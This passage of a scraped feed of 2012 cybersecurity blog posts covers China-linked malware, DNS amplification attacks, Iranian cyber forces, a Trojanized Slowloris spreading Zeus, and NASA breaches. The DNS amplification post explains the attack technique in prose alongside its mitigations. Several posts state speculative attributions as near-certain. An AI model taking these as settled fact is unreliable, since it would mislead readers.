independent group to attack other countries. Surely we are dealing with an assault sponsored by the Beijing government. Second point is related the close alliance with Iran, China share strong economic interests regarding oil supplies so there would be no reason to believe that Beijing intends to attack Iranian systems. Obviously, the goal is different and interesting is the mode of infection used, a surgical operation supported by time of great political tension surrounding the country.\n\nThe event should prompt a lot of concern and alert because the likelihood is high that more of these cyber attacks are on the way. Recent reports suggest that nations such as China, Iran, Russia and North Korea are already preparing stealth cyber-attacks against the U.S.\nWe are on heightened cyber alert!\n\nPierluigi Paganini\n\nReferences\n\nhttp://www.malwarecity.com/blog/malware-from-china-uses-iran-nuclear-tension-to-target-military-staff-1268.html\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/censorship", "topic_name": "Censorship"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/content-filtering", "topic_name": "Content filtering"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-criminals", "topic_name": "cyber criminals"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/espionage", "topic_name": "Espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet-monitoring", "topic_name": "internet monitoring"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/monitoring", "topic_name": "monitoring"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/web-control", "topic_name": "web control"}]}, {"news_name": "Anonymous, DNS Amplification Attacks for Operation Global Blackout", "news_link": "https://securityaffairs.co/wordpress/3184/cyber-crime/anonymous-dns-amplification-attacks-for-operation-global-blackout.html", "title": "Anonymous, DNS Amplification Attacks for Operation Global Blackout\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 9, 2012", "body": "In this first couple of months of 2012 we have assisted to an escalation of cyber attacks made by  groups of hacktivist, first Anonymous, that have hit main institutions and agencies all over the world. The modus operandi of the group is now well known, attacks that have crippled many victims were mainly of DDoS type, in this way the group has made many web sites inaccessible.\n\nDespite the large number of operations carried out successfully, from the attack to FBI to the one against the CIA, up to now have been warded off attacks capable of making inaccessible the whole Internet. For a long time now, in Internet has persistently circulated the news of a possible attack on a global scale which has as its goal to bring down the entire Internet\u2019s Domain Name System (DNS) called a \u201ctroll\u201d by members of Anonymous.\n\nMany experts believe the group is working for some time to a new generation of cyber weapon to use in future operations. Until today much of the success of the operation made by the group is related to two main factors, the surprise effect and the critical mass of supporters engaged in the actions. This means that in addition to conventional tools for DDoS (e.g. LOIC) it\u2019s normal to expect the genesis of new methods of attack.\n\nWhat would be an effective and attractive attack technique for the group of hacktivist?\n\nA highly efficient method is known as DNS Amplification Attacks, although known for years could be extremely damaging to the current structure of the internet, let\u2019s examine it in detail.\n\nThe Domain Name System (DNS) is implemented through a tree-like system of delegations. A recursive process is used to follow the chain of delegations, starting at the Root zone, and ending up at the domain name requested by the client. A recursive name server may need to contact multiple authoritative name servers to resolve given name. Ideally, a recursive name server should only accept queries from a local, or authorized clients but in reality many recursive name servers accept DNS queries from any source. To worsen the situation, many DNS implementations enable recursion by default, even when the name server is intended to only serve\nAuthoritative data. We say that a name server is an \u201copen resolver\u201d if it provides recursion to non-local users.\n\n\n\n \n\nThe DNS system has a hierarchical structure, at the top there are the \u201croot\u201d nameservers containing information on where to find the nameservers responsible for the next level down in the hierarchy, the nameservers for things like \u201c.com\u201d and \u201c.org\u201d and \u201c.uk.\u201d In turn, those nameservers contain information about the next level of the hierarchy and so on.\n\nImagine that we are interested to resolve the name securityaffairs.co so a client send the request to the DNS server. The root server will provide info regarding the \u201c.co\u201d and info regarding the next level in the structure \u201csecurityaffairs\u201d domain. The \u201csecurityaffairs\u201d nameserver is then able to provide the actual binding from the logical name and related IP address. Resuming a recursive process is used to follow the chain of delegations, starting at the Root zone, and ending up at the domain name requested by the client. A recursive name server may need to contact multiple authoritative name servers to resolve given name (e.g. www.net.compsci.googleplex.edu).\n\n\n\nLet\u2019s image the availability of a Botnet that send spoofed address queries to an Open Resolver causing it to send responses to the spoofed-address target. In this way the Resolver became the cyber gun against the victims, for which we have spoofed the address, participating in an attack on it.\nThis way to operate on a DNS ROOT server is called \u201crecursive mode\u201d, a client sends the request to the DNS server for the entire name then leaves it to perform all the necessary requests (either recursive or iterative) on its behalf.\n\nThere is also another mode to resolve a logical name called \u201cinteractive mode\u201c, in this case the resolver first queries the root nameservers for the top-level domain\u2019s nameservers, then queries the top-level domain\u2019s nameservers for the second level domain\u2019s nameservers, and so on and so forth. The resolver contacts the different nameservers directly to make the complete translation.\n\nOf course to speed up the described process are used caching mechanism by the name servers involved. This is the vulnerability in the process. The response to a DNS query can be considerably larger than the query itself. In the best (or worst) case, a query of just a few dozen bytes can ask for every name within a domain and receive hundreds or thousands of bytes in the response. Each request sent to a DNS server include a source address to which the reply should be sent, but this IP address can be spoofed, in this way is, a request can be sent from one IP address but the DNS server will think it was sent from a different address replying it.\n\nThe attack is really dangerous considering also the critical masses usable by groups of activist and considering also that typically a DNS query consisting of a 60 byte request that can be answered with responses of over 4000 bytes, amplifying the response packet by a factor of 65. In literature there are several variant of the attack one of them include a query only for the root name servers, the home of the Internet\u2019s root DNS servers. Because there are a large number of root name servers, and because the implementation of DNS-SEC has added certificate data to root server responses, the data returned for each request is about 20 times larger than the request packet.\n\nThe attack method is really powerful, in fact sending a small amount of data that compose a DNS request is it possible to redirect large quantity of data to a spoofed address, so sending a large number of requests to the server it is possible to flood the victims with the replies. The different size between the dimension of the request and related response is called \u201camplification\u201d attacks. To hide the origin of the attacks it is possible to modify the header of each UDP request this means that group like Anonymous could maintain anonymity adopting VPNs.\n\nWhich are the main effects of this kind of attacks?\n\nA DNS recursion attack is essentially an amplification DoS attack.  There are sever related effects like:\n\nHow to avoid this type of attacks?\n\nIt\u2019s simple, it is enough to disable recursion as recommended by US-CERT bulletins, but as usual this setting for DNS ignored. Given enough servers that enable recursion, large quantities of traffic can be produced from relatively modest numbers of queries. The Internet Engineering Task Force has proposed a best practices to solve the problem, an approach to \u201cingress filtering\u201d of packets, called BCP 38, that would block forged traffic like DNS amplification attacks. But the proposal hasn\u2019t moved very far forward since it was first submitted in 2000.The best countermeasures against DNS amplification must be taken on server side do not return replies to \u201c.\u201d queries and return shorter responses, reducing the amplification process.  Another option is the limitation of DNS requests to authorized clients.\n\nThe interest in the attack technique of the group of hackers has been shown by a document published recently on Pastebin announcing an operation called \u201cOperation Global Blackout\u201d an attack on the Internet\u2019s root DNS servers.\n\nMany experts are convinced that a similar attack would have little chance of success for several technical reasons. Despite their position I believe is fundamental to share information about what is considerable of a vulnerability in a process, hoping that the problem is not overlooked with disastrous consequences.\n\nThat is why I have chosen to write this article \u2026 Awareness first of all.\n\nPierluigi Paganini\n\nReferences\n\nhttp://securityaffairs.co/wordpress/3184/cyber-crime/anonymous-dns-amplification-attacks-for-operation-global-blackout.html\n\nhttp://www.isotf.org/news/DNS-Amplification-Attacks.pdf\n\nhttp://arstechnica.com/business/news/2012/03/how-anonymous-plans-to-use-dns-as-a-weapon.ars/1\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/botnets", "topic_name": "Botnets"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cia", "topic_name": "CIA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/content-filtering", "topic_name": "Content filtering"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dns", "topic_name": "DNS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dns-amplification-attacks", "topic_name": "DNS Amplification Attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fbi", "topic_name": "FBI"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivist", "topic_name": "hacktivist"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet", "topic_name": "Internet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/large-scale-infiltration", "topic_name": "Large scale infiltration"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/operation-global-blackout", "topic_name": "Operation Global Blackout"}]}, {"news_name": "Iran from cyber warfare to the oil war", "news_link": "https://securityaffairs.co/wordpress/3132/security/iran-from-cyber-warfare-to-the-oil-war.html", "title": "Iran from cyber warfare to the oil war\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 7, 2012", "body": "\n\n\nWinds of war blowing in the Middle East, increasingly insistent rumors of a possible attack on Iran by Israel or the U.S.. In internet it is possible to find many news regarding the topic that declare both Iran and nations opposing them seem intentioned to attack. In this stage, the contenders are engaged in a mutual and intense phase of the trial during which they are seeking approval from the major nations of the world. If everything seems to stopped on the military front, with the exception of some propaganda exercise, on the front warfare it is possible to register a huge quantity of operations. The choice of operating first in cyberspace offers obvious advantages, reduced costs, high offensive potential and ability to operate actions of intelligence extended in time to study the vulnerabilities of the adversary.\nVirus Stuxnet and similar weapons have teach to the world how could be effective a cyber weapon, it is silent and it could be attack critical infrastructures with serious implications.\n\n\n\nThe United States are aware of the imminent threat of possible attacks on American soil, however, are pursuing a policy that is softer looking international consent and aiming to hit Iran economically and politically with penalties and warnings. Clearly the intention of the Obama administration to take time, we are close to the November elections and a possible attack could certainly affect the outcome of the vote. Many are convinced that President Obama would start a war with Iran for the purpose only of winning re-election in November, defeating the old enemy would be a flywheel for a media campaign with an uncertain outcome, an option to use in case of difficulty.\n\nThe decision to attack Iran is justified by the need to arrest the nuclear program of Teheran, but the US director of national intelligence, who coordinates all the US security agencies, admits Iran haven\u2019t yet built a nuclear weapon but according several intelligence source it could be do it in a couple of year. Let\u2019s consider that in more or less 16 years Iran, according IAEA (International Atomic Energy Agency (IAEA) reports has put conducted a significant nuclear program with some 8,000 operational centrifuges installed in two major sites, and a stockpile of about five tons of low-enriched uranium.\n\nActually the western orientation is to combine penalties to the government of Teheran trying to reduce its oil exportation and boycotting Iranian banks and Iranian companies.\nBesides these official operations certainly have been launched covert operations aimed at undermining its nuclear program and the nation itself, as the development of Stuxnet and the murder of scientists engaged in nuclear research in Iran.\n\nThe idea of \u200b\u200ba conventional conflict scares many countries to possibly spending to be incurred in case of attack, in fact although Iran is no great military threat it has invested in a robust defensive structures which would be enormously costly to bypass in case of attack.  Under Cyber warfare perspective we must consider Iranian expertise. During the protests after the disputed election in 2009 Iran has demonstrated to have the complete control of its cyberspace thanks the collaboration of western companies and to strategic alliance with technologic countries like China. The country is investing in cyber training program and in recruiting of young nationalist building a parallel covert cyber army already engaged to suppress domestic protest that could be easily employed like a cyber weapon against external enemies.\n\nIt must be clear that no government agency has recognized the control of National cyber army, but it is clear that the Revolutionary Guards are behind it.\nThe Iranian Revolutionary Guards Corps, IRGC, seems to have built one of the largest forces of hackers on the planet. \u201cEmperor\u201d, \u201cIran Hackers Sabotage\u201d these are the names of the main group of hackers that during the last year have conducted several operation like destroy a government database or hack into two candidates\u2019 websites. during the 2005 presidential election. If in terms of cyber offense Iran has a considerable force not so it can be said of cyber defense strategy.\nObviously not all hacking groups in Iran are under government control, emblematic is the case of a group that managed to carry out a fraud to the detriment of some banks in the country for several million dollars.\nIn May 2010, Ebrahim Jabbari, a provincial Revolutionary Guards commander, declared that the IRGC had the world\u2019s second-largest cyber army at its disposal, the US intelligence is convinced of the potential of groups to the point of recognizing them as among the major cyber threats to the country.\n\nIn addition to cyber warriors and mercenaries, the Iran regime also has the control of the private IT firm Ashiyane Security Group, which has coordinated several cyber-attacks from Iran. Its illustrious victims are Mossad, Mossad, defence minister Ehud BarakNASA and several websites in the Arab world.\n\nThis could be the war of the oil, Iran is aware of this and also its partner like China. Consider that Europe import daily 600,000 barrels of oil from Iran. Their Iranian imports are based on favorable arrangements which will be difficult to replace at the same price or quality. New contracts must be negotiated with new alternative suppliers and this is a great unknown. The impact of a possible war would weigh significantly on the entire global economy, itself already highly unstable and precarious.\n\nIn this very delicate game a fundamental rule is assumed by actors such as China that fearing an Israeli attack may try to influence Tehran politics. China is one of the main import of Iranian oil and a conflict in the region could impact seriously its economy. It\u2019s quite difficult to predict what will China do, president Hu Jintao, and his top foreign affairs deputy, Dai Bingguo, don\u2019t have to be convinced that Israel will attack; rather, they only have to have serious doubts that it will back down.\n\nIn the light of the possibility of attack what might China be asked to do? Reducing purchases of Iranian crude, increasing diplomatic pressure, and more actively enforcing the four current U.N. Security Council resolutions on the Iranian nuclear issue, subordinate investments contingent on Iran\u2019s willingness to cooperate with the international community on its nuclear program.\n\nI personally think that only Beijing can succeed where others have failed so far with diplomacy, the resolution of hostilities is difficult and will surely bring its aftermath, but all are convinced that a possible war against Iran today would be a price to high to pay.\n\nIf the threats of Teheran will have a costs superior to damages related to a possible strike made by international community for sure it will be considered the assault option, any attempt at mediation will fail and the attack would be inevitable and desirable.\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/attack", "topic_name": "attack"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberspace", "topic_name": "cyberspace"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/inteligence", "topic_name": "inteligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/oil", "topic_name": "Oil"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/war", "topic_name": "war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}, {"news_name": "Mud against Anonymous using Zeus malware", "news_link": "https://securityaffairs.co/wordpress/3095/cyber-crime/mud-against-anonymous-using-zeus-malware.html", "title": "Mud against Anonymous using Zeus malware\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 6, 2012", "body": "Symantec company recently has disclosed the news that the collective Anonymous has deceived his supporters favoring the spread and installing of Zeus malware on their machines. The charge is heavy and would undermine the trust that underpins the recruitment methods of the collective, it seems that all supporters who have participated to various Distributed Denial of Service (DDoS) attacks may have installed unknowingly a variant of Zeus malware used to gather information like e-mail and banking information.\n\nHow can this happened? In a very simple, some hackers have exploited the notoriety of the collective disseminating an infected version of the tools used in the attacks, in this case the tool Slowloris, using standard channels as Pastbin. The hackers have copied and pasted an original Anonymous Pastebin entry replacing the download link with an infected version. In this way the agent diffusion was extremely rapid.\n\n\n\nEvents dating on January 19, 2012, when authorities stopped Megaupload services, and Anonymous hackers have conducted several DDoS attacks retaliated by taking down DOJ, RIAA, MPAA, Universal Music websites, among others.  During the attacks Anonymous released a list of several different DDoS attack tools that supporters have downloaded.\n\nRemember that in the past weeks I had anticipated the possibility that someone could use the name Anonymous in other operations, from cybercrime to intelligence operations made by hostile governments, that is why I defined Anonymous a cyber weapon.\nThe reputation of the group may paradoxically create many problems to the group itself, the audience to which the collective targets is not in fact capable of distinguishing false messages, and infiltration attempts that are occurring and will occur with increasing frequency.\nMy opinion is that Anonymous is completely outside to the events, I still unclear the direction of these attacks to the group. It could be a mud machine set up to discredit the group, or the operation made by unscrupulous criminals who try to benefit from favorable situation to spread of malware useful for realization of fraud. Third hypothesis is anything but fiction that one foreign government is exploiting the emotional involvement in the collective to collect an impressive amount of information on participants in operations.\n\nThe choice of the Zeus malware is in my opinion another indication of the possibility that someone is trying to hide its tracks by attacking the group of hacktivist. Zeus is in fact a trojan which first appeared in 2007 and several different instances have been observed during this years. A real parallel market has in fact set up a criminal industry that can customize the agent on demand with components developed and commissioned for any specific purpose.  Zeus is used to steal banking information via two methods, man-in-the-browser and keystroke logging form grabbing.\n\nOnce installed and executed, the infected version of Slowloris uses the Zeus botnet client to send stolen information to the C&C server. During the transfer the boot master order to the infected machine to continue to perform the attacks against Anonymous\u2019s target ensuring that the victim will not notice the fraud.\n\nSecurity firm Symantec has the details:\n\nAn attacker took a popular PasteBin guide, used by Anonymous members for downloading and using the DoS tool Slowloris, and modified it. In this modified version, the attacker changed the download link to a Trojanized version of the Slowloris tool with matching text. Later that same day, a separate Anonymous DoS guide was posted on PasteBin which included links to various DoS tools. Slowloris was included in this list of tools\u2014the Trojanized version copied from the modified guide.\n\nThe anonymous group immediately dismissed all charges through the major social networks like Twitter, following a collection of the principal messages.\n\nYourAnonNews, which has 547,000 followers, had a very negative reaction:\n\nThis post from @Symantec about @YourAnonNews\u2019s spreading the DDOS hijacking trojan is wrong & libelous to say the least\nDear @Symantec \u2013 @YourAnonNews NEVER posted the DDOS hijacker nor did we attempt to trick people; instead we WARNED of it.\nAlso, @Symantec \u2013 maybe if you paid attention to more details and did proper due diligence, your source code wouldn\u2019t have been stolen. SMH\n\nAnonymousIRC, which has 277,000 followers simply warned its followers:\n\nhttp://is.gd/vF8RUU | #Anonymous supporters tricked into installing Zeus trojan | This MUSTN\u2019T happen. Be careful what you post & click on!\n\nAnonOps, which has 297,000 followers, did not tweet anything about the report. It did, however, retweet this message from our sister site CNET:\n\nDid Anonymous itself get \u201chacked\u201d? Symantec says yes. But Anonymous begs to differ. http://cnet.co/xE7A2s\n\nGroupAnon, which has 72,000 followers, did not react to the news at all.\n\nIt seems to me that someone is pursuing a different strategy to counter the Anonymous group questioning his actions before the masses. You are trying to portray the group as ruthless criminals ready to sacrifice the masses from which she draws strength regardless of the consequences. As repeatedly stressed the group can not be countered with arrests and other operations of oppression, but must be fought with intelligence and infiltration operations that lead to mutual distrust affiliates and supporters. Undermine the nucleus, to induce suspicion in the policies pursued and the methods used.\nDivide and conquer.\n\nPierluigi Paganini\n\nhttp://securityaffairs.co/wordpress/3095/cyber-crime/mud-against-anonymous-using-zeus-malware.html\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacker", "topic_name": "hacker"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/man-in-the-browser", "topic_name": "man-in-the-browser"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/zeus-malware", "topic_name": "Zeus malware"}]}, {"news_name": "NASA unprepared for cyber attacks", "news_link": "https://securityaffairs.co/wordpress/3068/cyber-crime/nasa-unprepared-for-cyber-attacks.html", "title": "NASA unprepared for cyber attacks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 5, 2012", "body": "Everything started last week when has been announced that a laptop stolen from NASA during last year contained command codes used to control the International Space Station.

Martin admitted:\n\n\u201cthe attackers had full functional control over these networks.\u201d\n\nHe said that the attackers are able to gain full control on the systems of Nasa, this means that the hackers are able to operate freely exposing sensitive files or uploading hacking tools to steal user credentials and compromise the ordinary elaboration.\n\nThe situation is puzzling, what sense does it allocate investments of billions of dollars in aerospace research when the results of these efforts are within the reach of evil-minded hackers across the world?\n\nContinuing with the internal investigation revealed a disarming scene, according to a report filed with the US House of Representatives last Wednesday none of the agency\u2019s portable devices are encrypted. At least one of the stolen laptop containing algorithms to command and control the International Space Station.\n\nThe report notes that while around 54 percent of devices used government-wide are encrypted, only 1 percent of NASA\u2019s devices are encrypted as of February 2012.\n\nAs can be imagined, the situation is extremely worrying and it is essential that any required actions are taken to address the cyber threats. Do not forget that NASA is one of the leading agencies in the world for Aeronautical and Space activities and it is therefore expected that its systems are the subject of innumerable attacks by hostile governments, by group of hacktivists , cyber criminals and hackers that want to test their skills against a strategic objective.\n\n\nI personally think that the origin concern about these attacks is that due to cyber espionage, as occurred in the past for other aerospace agencies such as the Japanese one.\nMr Martin noted investigations had resulted in \u201carrests and convictions of foreign nationals in China, Great Britain, Italy, Nigeria, Portugal, Romania, Turkey, and Estonia\u201d, everyone seems to be interested to the Nasa.\n\nIt is therefore essential that the defense capabilities of these systems that represent critical structures will grow in relation to the pressing cyber threats.\n\nPierluigi Paganini\n\nUPDATE\n\nAfter all this discussion I leave you with some thoughts \u2026 the site of NASA is a government site still open today, it is possible to walk down the directory structure. I understand that they are being reported to federal agencies like the FBI, which would seem little interested in it.\nWhat is the real value that we give this information?\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivists", "topic_name": "hacktivists"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/incident", "topic_name": "Incident"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence-operations", "topic_name": "intelligence operations"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nasa", "topic_name": "NASA"}]}, {"news_name": "Young cyber army, cyber threat or resource to enhance?", "news_link": "https://securityaffairs.co/wordpress/2974/cyber-crime/young-cyber-army-cyber-threat-or-resource-to-enhance.html", "title": "Young cyber army, cyber threat or resource to enhance?\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 29, 2012", "body": "We live in economically tumultuous days and even more in the cyberspace. Not a day goes by that you do not observe a striking hack, yet another multinational ridiculed and made bare and vulnerable to human eyes. It\u2019s happened with Sony, with RSA with Stratfor, clay giants collapsed at the hands of groups of hactivists, a game in which the forces involved are comparable despite the predictable budget differences. David against Goliath, the moralizing hackers able to wrest the justice from the hands of those were trampling it.\nWe must recognize that the model is undoubtedly having an effect on the audience of young people, all know the collective Anonymous and all share its strategy.\nAnd then how to deal with this uncomfortable reality?\n\n\nI am deeply convinced that an ideology can not be fought with repression, with the arrests, arriving to the clash, but must be well understood and the only way to tackle the threat is come back till its genesis.\n\nA significant aspect is the awareness of the threat among young people. Take part to a cyber attack armed with LOIC is much more of a student spirit, yet this is the perception, the search for an interior dimension where they can feel great among the great, defeating services provided by names such as FBI or CIA with whom they grew up. The threat is high, it is necessary to arrange as soon as possible a serious campaign of information and active participation, we run the risk to have at home a generation of young people ready to be recruited in cyber attacks, a sort of a modern Troy horse .\n\nIn an ideal situation the institution should start from below, from schools to present the cyber threats and educate students on the techniques of prevention. This should only be a first step, which should be followed by the arrangement of specific hacking training programs. Many Eastern countries, especially China, are investing heavily in the potential of its young people who are now enrolled and engaged in intense training programs to increase their cyber capabilities.\nLet consider the Chinese model, these new recruits are primarily interested in the subject and the central government provides a wide range of relief for deserving students and their families. This in my view means looking ahead, prepare for a future that is radically changing the way we live.\n\nIt is required a global change involving the new generation, giving to young people tools and knowledge to understand how disastrous can be a cyber attack and how much is sensitive to the choice of participating in a protest action style Anonymous. We tell them that with the same mode of attack it is possible to offend a hostile country, damaging telecommunications systems and other critical infrastructure.\nIn this way I am quite sure that the cyber threat like Anonymous can be mitigated \u2026 but it is really what we want?\n\nBe careful, I\u2019m not professing to create cyber armies of young hackers but rather a widespread dissemination of information on cyber threats. I live young realities and I know young people\u2019s attention to the matter, it is a pity not to exploit this potential especially in a time of great difficulty as that in which we live. Addressing young in this science we can create job opportunities and increase level of security of our countries.\n\nWe must invest in young people, we must  invest in security, we must  invest in our future!\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber", "topic_name": "cyber"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-army", "topic_name": "cyber army"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threat", "topic_name": "cyber threat"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyberwarfare", "topic_name": "cyberwarfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivist", "topic_name": "hacktivist"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hactivist", "topic_name": "hactivist"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet", "topic_name": "Internet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stratfor", "topic_name": "Stratfor"}]}, {"news_name": "Syria, a massacre began on the web", "news_link": "https://securityaffairs.co/wordpress/2908/cyber-warfare-2/syria-a-massacre-began-on-the-web.html", "title": "Syria, a massacre began on the web\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 26, 2012", "body": "Syria massacre shocks the world, syrian army has repeatedly bombed the protest city of Homs killing several hundred civilians. The images of the bombings and violence have been broadcasted by the main satellites television Al-Arabiya and Al Jazera, but the Damascus government denied involvement in operations made against civilians, blaming groups of mercenaries trying to incite unrest ahead of a possible Security Council vote. The attacks have been ordered by the President Assad committing one of the most horrific massacres since the beginning of the uprising in Syria\u201d.\n\n\n\nOther assaults have been directed against the northern town of Jisr al-Shughur near the Turkish border and suburbs of Damascus.\n\n\u201dIt\u2019s a real massacre\u201d Syrian Observatory for Human Rights director Rami Abdel Rahman told AFP, calling for \u201dimmediate intervention\u201d by the Arab League.\n\nAmong the main concerns of the 